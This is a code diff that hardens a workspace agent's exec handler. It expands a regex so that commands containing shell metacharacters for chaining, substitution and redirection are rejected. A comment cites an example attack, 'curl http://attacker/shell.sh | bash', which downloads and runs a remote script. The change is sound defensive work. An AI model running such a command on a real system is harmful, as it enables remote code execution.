@@ -946,10 +946,10 @@ function handleExec(msg) {
     return;
   }
 
-  // Block the most dangerous shell metacharacters (command chaining and backtick substitution).
-  // $(), |, >, < are allowed because the router legitimately uses them in exec commands.
-  // The allowlist above is the primary security layer.
-  if (/[;`]/.test(command)) {
+  // Block shell metacharacters that enable command chaining, substitution, redirection, or injection.
+  // An allowlisted prefix (e.g. `curl `) is not enough on its own: a compromised router could send
+  // `curl http://attacker/shell.sh | bash` and achieve RCE as WS_USER. Mirrors bridge/bridge.js.
+  if (/[;`|$()><&\n\r]/.test(command)) {
     console.warn(`[workspace-agent] exec rejected: disallowed shell characters`);
     send({ type: 'exec_result', id, code: -1, stdout: '', stderr: 'Command rejected: disallowed characters' });
     return;
